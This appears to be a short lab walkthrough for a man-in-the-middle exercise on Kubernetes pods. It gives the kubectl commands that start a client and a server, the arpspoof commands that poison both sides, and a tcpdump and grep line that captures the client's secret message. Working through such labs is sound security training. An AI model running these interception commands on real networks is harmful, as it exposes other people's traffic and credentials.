# Scenario set up
- Start pod server: `kubectl run server-mitm --image=viet009/server-mitm:0.01`
- Start pod client: `kubectl run client-mitm --image=viet009/client-mitm:0.01 --env="IP={server-internal-ip}" --env="PORT=8000"`

# Victim description

-   `Client` will send to `server` periodically a secret message. Our job is to capture what is that secret

# Set up MITM attack: With ARP poisoining

-   Step 1:
    -   poison client side: `arpspoof -i eth0 -t (server_ip address) (client_ip address)`
-   Step 2:
    -   poison server side: `arpspoof -i eth0 -t (client_ip address) (server_ip address)`
-   Step 3:
    -   packet sniffing in the middle with `tcpdump`
    -   Capture GET requests: `tcpdump -Alvvs0 | grep 'GET'`
